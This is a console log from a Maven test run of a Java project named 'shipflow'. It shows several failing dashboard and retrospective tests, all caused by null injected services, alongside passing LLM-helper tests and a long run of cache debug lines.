2026-01-17T23:26:49.655Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomDashboardService   : Toggling user context filter for dashboard 999 (user: 1)
2026-01-17T23:26:49.655Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomDashboardService   : Toggling user context filter for dashboard 1 (user: 1)
2026-01-17T23:26:49.656Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomDashboardService   : Toggled user context filter to false for dashboard 1
2026-01-17T23:26:49.657Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomDashboardService   : Toggling user context filter for dashboard 1 (user: 1)
[ERROR] Tests run: 5, Failures: 1, Errors: 0, Skipped: 0, Time elapsed: 0.114 s <<< FAILURE! -- in com.github.farzadsedaghatbin.shipflow.service.CustomDashboardServiceTest$UserContextFilterTests
[ERROR] com.github.farzadsedaghatbin.shipflow.service.CustomDashboardServiceTest$UserContextFilterTests.shouldThrowExceptionWhenUserNotAuthorized -- Time elapsed: 0.002 s <<< FAILURE!
org.opentest4j.AssertionFailedError: Unexpected exception type thrown, expected: <java.lang.SecurityException> but was: <java.lang.NullPointerException>
	at org.junit.jupiter.api.AssertionFailureBuilder.build(AssertionFailureBuilder.java:151)
	at org.junit.jupiter.api.AssertThrows.assertThrows(AssertThrows.java:67)
	at org.junit.jupiter.api.AssertThrows.assertThrows(AssertThrows.java:35)
	at org.junit.jupiter.api.Assertions.assertThrows(Assertions.java:3115)
	at com.github.farzadsedaghatbin.shipflow.service.CustomDashboardServiceTest$UserContextFilterTests.shouldThrowExceptionWhenUserNotAuthorized(CustomDashboardServiceTest.java:441)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
Caused by: java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String)" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.CustomDashboardService.toggleUserContextFilter(CustomDashboardService.java:245)
	at com.github.farzadsedaghatbin.shipflow.service.CustomDashboardServiceTest$UserContextFilterTests.lambda$shouldThrowExceptionWhenUserNotAuthorized$6(CustomDashboardServiceTest.java:442)
	at org.junit.jupiter.api.AssertThrows.assertThrows(AssertThrows.java:53)
	... 7 more

[INFO] Running com.github.farzadsedaghatbin.shipflow.service.CustomDashboardServiceTest$ScopeFeatureTests
2026-01-17T23:26:49.660Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomDashboardService   : Creating custom dashboard 'Invalid Cycle Dashboard' for user 1
2026-01-17T23:26:49.661Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomDashboardService   : Creating custom dashboard 'Global Dashboard' for user 1
2026-01-17T23:26:49.661Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomDashboardService   : Created custom dashboard with ID: 104
2026-01-17T23:26:49.663Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomDashboardService   : Creating custom dashboard 'Multi-Scope Dashboard' for user 1
2026-01-17T23:26:49.663Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomDashboardService   : Created custom dashboard with ID: 103
2026-01-17T23:26:49.664Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomDashboardService   : Creating custom dashboard 'Team Dashboard' for user 1
2026-01-17T23:26:49.664Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomDashboardService   : Created custom dashboard with ID: 102
2026-01-17T23:26:49.665Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomDashboardService   : Creating custom dashboard 'Cycle Dashboard' for user 1
2026-01-17T23:26:49.665Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomDashboardService   : Created custom dashboard with ID: 100
2026-01-17T23:26:49.666Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomDashboardService   : Creating custom dashboard 'Invalid Team Dashboard' for user 1
2026-01-17T23:26:49.667Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomDashboardService   : Creating custom dashboard 'Pitch Dashboard' for user 1
2026-01-17T23:26:49.667Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomDashboardService   : Created custom dashboard with ID: 101
2026-01-17T23:26:49.668Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomDashboardService   : Creating custom dashboard 'Invalid Pitch Dashboard' for user 1
[INFO] Tests run: 8, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.009 s -- in com.github.farzadsedaghatbin.shipflow.service.CustomDashboardServiceTest$ScopeFeatureTests
[INFO] Tests run: 0, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.124 s -- in com.github.farzadsedaghatbin.shipflow.service.CustomDashboardServiceTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.RetroServiceTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.RetroServiceTest$RetroItemTests
[ERROR] Tests run: 5, Failures: 2, Errors: 0, Skipped: 0, Time elapsed: 0.328 s <<< FAILURE! -- in com.github.farzadsedaghatbin.shipflow.service.RetroServiceTest$RetroItemTests
[ERROR] com.github.farzadsedaghatbin.shipflow.service.RetroServiceTest$RetroItemTests.cannotUpdateItemInClosedRetro -- Time elapsed: 0.324 s <<< FAILURE!
java.lang.AssertionError: 

Expecting actual throwable to be an instance of:
  java.lang.IllegalStateException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String)" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.RetroService.updateRetroItem(RetroService.java:215)
	at com.github.farzadsedaghatbin.shipflow.service.RetroServiceTest$RetroItemTests.lambda$cannotUpdateItemInClosedRetro$0(RetroServiceTest.java:411)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(83 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
	at com.github.farzadsedaghatbin.shipflow.service.RetroServiceTest$RetroItemTests.cannotUpdateItemInClosedRetro(RetroServiceTest.java:412)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)

[ERROR] com.github.farzadsedaghatbin.shipflow.service.RetroServiceTest$RetroItemTests.cannotDeleteItemFromClosedRetro -- Time elapsed: 0.001 s <<< FAILURE!
java.lang.AssertionError: 

Expecting actual throwable to be an instance of:
  java.lang.IllegalStateException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String)" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.RetroService.deleteRetroItem(RetroService.java:233)
	at com.github.farzadsedaghatbin.shipflow.service.RetroServiceTest$RetroItemTests.lambda$cannotDeleteItemFromClosedRetro$1(RetroServiceTest.java:436)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(83 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
	at com.github.farzadsedaghatbin.shipflow.service.RetroServiceTest$RetroItemTests.cannotDeleteItemFromClosedRetro(RetroServiceTest.java:437)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)

[INFO] Running com.github.farzadsedaghatbin.shipflow.service.RetroServiceTest$ErrorHandlingTests
[ERROR] Tests run: 4, Failures: 2, Errors: 0, Skipped: 0, Time elapsed: 0.004 s <<< FAILURE! -- in com.github.farzadsedaghatbin.shipflow.service.RetroServiceTest$ErrorHandlingTests
[ERROR] com.github.farzadsedaghatbin.shipflow.service.RetroServiceTest$ErrorHandlingTests.cannotUpdateClosedRetro -- Time elapsed: 0.001 s <<< FAILURE!
java.lang.AssertionError: 

Expecting actual throwable to be an instance of:
  java.lang.IllegalStateException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String)" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.RetroService.updateRetro(RetroService.java:110)
	at com.github.farzadsedaghatbin.shipflow.service.RetroServiceTest$ErrorHandlingTests.lambda$cannotUpdateClosedRetro$2(RetroServiceTest.java:356)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(83 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
	at com.github.farzadsedaghatbin.shipflow.service.RetroServiceTest$ErrorHandlingTests.cannotUpdateClosedRetro(RetroServiceTest.java:357)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)

[ERROR] com.github.farzadsedaghatbin.shipflow.service.RetroServiceTest$ErrorHandlingTests.cannotOpenClosedRetro -- Time elapsed: 0.001 s <<< FAILURE!
java.lang.AssertionError: 

Expecting actual throwable to be an instance of:
  java.lang.IllegalStateException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String)" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.RetroService.openRetro(RetroService.java:133)
	at com.github.farzadsedaghatbin.shipflow.service.RetroServiceTest$ErrorHandlingTests.lambda$cannotOpenClosedRetro$3(RetroServiceTest.java:368)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(83 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
	at com.github.farzadsedaghatbin.shipflow.service.RetroServiceTest$ErrorHandlingTests.cannotOpenClosedRetro(RetroServiceTest.java:369)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)

[INFO] Running com.github.farzadsedaghatbin.shipflow.service.RetroServiceTest$CycleCloseEnforcementTests
[INFO] Tests run: 5, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.004 s -- in com.github.farzadsedaghatbin.shipflow.service.RetroServiceTest$CycleCloseEnforcementTests
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.RetroServiceTest$RetroLifecycleTests
[ERROR] Tests run: 5, Failures: 1, Errors: 0, Skipped: 0, Time elapsed: 0.004 s <<< FAILURE! -- in com.github.farzadsedaghatbin.shipflow.service.RetroServiceTest$RetroLifecycleTests
[ERROR] com.github.farzadsedaghatbin.shipflow.service.RetroServiceTest$RetroLifecycleTests.cannotAddItemsToClosedRetro -- Time elapsed: 0.001 s <<< FAILURE!
java.lang.AssertionError: 

Expecting actual throwable to be an instance of:
  java.lang.IllegalStateException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String)" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.RetroService.createRetroItem(RetroService.java:187)
	at com.github.farzadsedaghatbin.shipflow.service.RetroServiceTest$RetroLifecycleTests.lambda$cannotAddItemsToClosedRetro$1(RetroServiceTest.java:233)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(83 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
	at com.github.farzadsedaghatbin.shipflow.service.RetroServiceTest$RetroLifecycleTests.cannotAddItemsToClosedRetro(RetroServiceTest.java:234)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)

[INFO] Running com.github.farzadsedaghatbin.shipflow.service.RetroServiceTest$TeamSettingTests
[ERROR] Tests run: 3, Failures: 1, Errors: 0, Skipped: 0, Time elapsed: 0.003 s <<< FAILURE! -- in com.github.farzadsedaghatbin.shipflow.service.RetroServiceTest$TeamSettingTests
[ERROR] com.github.farzadsedaghatbin.shipflow.service.RetroServiceTest$TeamSettingTests.retroOperationsBlockedWhenDisabled -- Time elapsed: 0.002 s <<< FAILURE!
java.lang.AssertionError: 

Expecting actual throwable to be an instance of:
  java.lang.IllegalStateException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String)" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.RetroService.validateRetrospectivesEnabled(RetroService.java:429)
	at com.github.farzadsedaghatbin.shipflow.service.RetroService.getAllRetrosByProject(RetroService.java:34)
	at com.github.farzadsedaghatbin.shipflow.service.RetroServiceTest$TeamSettingTests.lambda$retroOperationsBlockedWhenDisabled$0(RetroServiceTest.java:148)
	...(84 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
	at com.github.farzadsedaghatbin.shipflow.service.RetroServiceTest$TeamSettingTests.retroOperationsBlockedWhenDisabled(RetroServiceTest.java:149)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)

[INFO] Tests run: 0, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.346 s -- in com.github.farzadsedaghatbin.shipflow.service.RetroServiceTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.CycleServiceTest
2026-01-17T23:26:50.083Z  WARN 89700 --- [shipflow] [           main] c.g.f.shipflow.service.CycleService      : Invalid or missing default cycle length configuration (value: null). Falling back to Shape Up standard of 6 weeks.
[INFO] Tests run: 19, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.073 s -- in com.github.farzadsedaghatbin.shipflow.service.CycleServiceTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.qa.PromptCompressorTest
2026-01-17T23:26:50.088Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.PromptCompressor      : Compressed prompt: 33 chars → 25 chars ({:.1f}% reduction)
2026-01-17T23:26:50.088Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.PromptCompressor      : Compressed prompt: 82 chars → 47 chars ({:.1f}% reduction)
2026-01-17T23:26:50.088Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.PromptCompressor      : Compressed prompt: 25 chars → 21 chars ({:.1f}% reduction)
[INFO] Tests run: 9, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.003 s -- in com.github.farzadsedaghatbin.shipflow.service.qa.PromptCompressorTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.qa.FeedbackLearningServiceTest
2026-01-17T23:26:50.200Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.qa.FeedbackLearningService     : Recorded feedback for interaction 200: helpful=true
2026-01-17T23:26:50.201Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.qa.FeedbackLearningService     : Recorded feedback for interaction 201: helpful=true
2026-01-17T23:26:50.201Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.qa.FeedbackLearningService     : Recorded feedback for interaction 202: helpful=true
2026-01-17T23:26:50.201Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.qa.FeedbackLearningService     : Recorded feedback for interaction 1: helpful=true
2026-01-17T23:26:50.202Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.qa.FeedbackLearningService     : Recorded feedback for interaction 1: helpful=false
2026-01-17T23:26:50.202Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.qa.FeedbackLearningService     : Recorded feedback for interaction 0: helpful=true
2026-01-17T23:26:50.202Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.qa.FeedbackLearningService     : Recorded feedback for interaction 1: helpful=true
2026-01-17T23:26:50.202Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.qa.FeedbackLearningService     : Recorded feedback for interaction 2: helpful=true
2026-01-17T23:26:50.203Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.qa.FeedbackLearningService     : Recorded feedback for interaction 10: helpful=false
2026-01-17T23:26:50.203Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.qa.FeedbackLearningService     : Recorded feedback for interaction 100: helpful=false
2026-01-17T23:26:50.203Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.qa.FeedbackLearningService     : Recorded feedback for interaction 101: helpful=false
2026-01-17T23:26:50.204Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.qa.FeedbackLearningService     : Recorded feedback for interaction 102: helpful=false
2026-01-17T23:26:50.204Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.qa.FeedbackLearningService     : Recorded feedback for interaction 1: helpful=true
2026-01-17T23:26:50.206Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.qa.FeedbackLearningService     : Recorded feedback for interaction 2: helpful=false
2026-01-17T23:26:50.206Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.qa.FeedbackLearningService     : Recorded feedback for interaction 1: helpful=true
[INFO] Tests run: 11, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.115 s -- in com.github.farzadsedaghatbin.shipflow.service.qa.FeedbackLearningServiceTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.qa.QueryDecomposerTest
2026-01-17T23:26:50.207Z ERROR 89700 --- [shipflow] [           main] c.g.f.s.service.qa.QueryDecomposer       : Failed to decompose query, using original: Cannot invoke "java.lang.CharSequence.length()" because "this.text" is null
2026-01-17T23:26:50.208Z ERROR 89700 --- [shipflow] [           main] c.g.f.s.service.qa.QueryDecomposer       : Failed to decompose query, using original: LLM error
2026-01-17T23:26:50.209Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.QueryDecomposer       : Decomposed query into 2 sub-queries: [What are payment risks?, What are checkout risks?]
2026-01-17T23:26:50.210Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.QueryDecomposer       : Decomposed query into 2 sub-queries: [What are the payment feature risks?, What are the checkout redesign risks?]
2026-01-17T23:26:50.210Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.service.qa.QueryDecomposer       : Decomposition produced no sub-queries, using original: Compare payment vs checkout
2026-01-17T23:26:50.211Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.QueryDecomposer       : Decomposed query into 3 sub-queries: [What are the features to compare?, What are the associated risks?, Which teams are involved?]
[INFO] Tests run: 13, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.004 s -- in com.github.farzadsedaghatbin.shipflow.service.qa.QueryDecomposerTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.qa.TestCaseValidatorTest
[INFO] Tests run: 7, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.003 s -- in com.github.farzadsedaghatbin.shipflow.service.qa.TestCaseValidatorTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.qa.RAGEvaluatorTest
[INFO] Tests run: 5, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.055 s -- in com.github.farzadsedaghatbin.shipflow.service.qa.RAGEvaluatorTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.qa.LLMCacheServiceTest
2026-01-17T23:26:50.270Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 12b49acb
2026-01-17T23:26:50.270Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cache HIT for prompt hash: 12b49acb
2026-01-17T23:26:50.270Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cache HIT for prompt hash: 12b49acb
2026-01-17T23:26:50.270Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cache HIT for prompt hash: 12b49acb
2026-01-17T23:26:50.270Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cache HIT for prompt hash: 12b49acb
2026-01-17T23:26:50.270Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 42b69f29
2026-01-17T23:26:50.270Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: c05889ad
2026-01-17T23:26:50.270Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: e6361dc9
2026-01-17T23:26:50.270Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: f5178a5d
2026-01-17T23:26:50.270Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 1a3c3a98
2026-01-17T23:26:50.270Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: d897a6a8
2026-01-17T23:26:50.270Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 5942e3ec
2026-01-17T23:26:50.270Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 808b5920
2026-01-17T23:26:50.270Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 29a4c0fc
2026-01-17T23:26:50.270Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 3a0cecdd
2026-01-17T23:26:50.270Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 21dab7a3
2026-01-17T23:26:50.270Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 3adeca05
2026-01-17T23:26:50.270Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: a27200be
2026-01-17T23:26:50.270Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 43b4e6fe
2026-01-17T23:26:50.270Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 2a01b2b5
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: b6e7d9ad
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 6f4ef3a0
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: effbde6d
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 1bcf8b3e
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 42eca619
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: c58930a2
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 044ab961
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 7edfcdef
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 3f38654c
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 599d1c2d
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 83e08fa3
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 65c76252
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: c2417a32
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: d99c3972
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 10f4b784
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 9ee049c7
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: e325022b
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: dbd3a80e
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 8cebd310
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: d021f354
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: fd02f888
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: d3e39329
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: d4c8ac1f
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: be0ba40a
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: cc683311
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 21dd7167
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 8f050e48
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: cac95c4e
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 60f83895
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 78c11e1a
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 3357ab7a
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 83be17fa
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: acba10f7
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: e9bbc357
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: cc11e669
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 55ef21ee
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: e9c53396
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 9297778d
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 0fc2e0da
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: db753521
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 7283fd0a
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 96bbc51c
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 54eea7f9
2026-01-17T23:26:50.271Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 37103256
